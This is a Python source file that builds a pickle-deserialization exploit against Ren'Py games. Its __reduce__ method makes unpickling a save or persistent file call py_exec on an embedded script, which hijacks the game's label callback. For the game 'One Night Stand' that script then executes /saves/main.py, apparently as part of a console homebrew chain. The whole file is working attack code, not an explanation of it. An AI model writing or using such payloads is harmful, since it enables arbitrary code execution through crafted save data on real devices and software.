import os
import renpy

SCRIPT = """
import os
import sys
import traceback

sys.path.insert(0, "/saves")

class YarpeState(object):
    def __init__(self):
        self.logs = []
        self.game_initialized = False

renpy.store.yarpe_state = YarpeState()
ys = renpy.store.yarpe_state

def ylog(msg):
    ys.logs.append(msg)
    if len(ys.logs) > 400:
        del ys.logs[0:100]

ylog("YARPE: Initialized from persistent bootstrap.")

def yarpe_label_callback(label, abnormal):
    ylog("LABEL: %s (abnormal=%r)" % (label, abnormal))

    if (
        label in ("splashscreen", "_call__enter_game_menu_0")
        and not ys.game_initialized
    ):
        ys.game_initialized = True

        if (
            renpy.config.name == "One Night Stand"
            and os.path.isfile("/saves/main.py")
            and os.path.isfile("/saves/constants.py")
            and os.path.isfile("/saves/config.json")
            and os.path.isfile("/saves/version.txt")
        ):
            ylog("YARPE: Starting One Night Stand from installed files.")

            try:
                os.environ["CONSOLE_KIND"] = "__CONSOLE_KIND__"
                execfile("/saves/main.py", globals(), globals())
            except Exception as e:
                ylog("YARPE ERROR: direct startup failed: %r" % e)
                ylog(traceback.format_exc())
        else:
            ylog("YARPE: Loading slot '1-1'.")

            try:
                renpy.load("1-1")
            except Exception as e:
                ylog("YARPE ERROR: renpy.load('1-1') failed: %r" % e)

renpy.config.label_callback = yarpe_label_callback
ylog("YARPE: label_callback replaced with yarpe_label_callback.")
"""


class Yummy(object):
    def __reduce__(self):
        # CONSOLE_KIND is set by the running exploit when the trigger gets pickled
        script = SCRIPT.replace("__CONSOLE_KIND__", os.environ["CONSOLE_KIND"])
        return renpy.python.py_exec, (script,)
